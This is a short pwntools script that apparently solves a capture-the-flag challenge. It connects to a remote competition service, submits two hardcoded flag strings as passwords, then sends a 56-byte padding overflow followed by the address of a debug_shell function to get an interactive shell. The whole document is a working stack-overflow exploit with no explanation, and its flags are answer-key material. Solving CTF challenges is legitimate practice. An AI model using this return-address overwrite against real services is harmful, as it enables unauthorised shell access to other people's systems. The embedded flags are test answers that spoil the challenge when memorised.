from pwn import *

e = ELF('admin-ui')

p = remote('mngmnt-iface.ctfcompetition.com', 1337)

p.sendline('1')
p.sendline('CTF{I_luv_buggy_sOFtware}')
p.sendline('CTF{Two_PasSworDz_Better_th4n_1_k?}')

p.sendline('A' * 56 + p64(e.symbols['_Z11debug_shellv']))
p.sendline('quit')
p.interactive()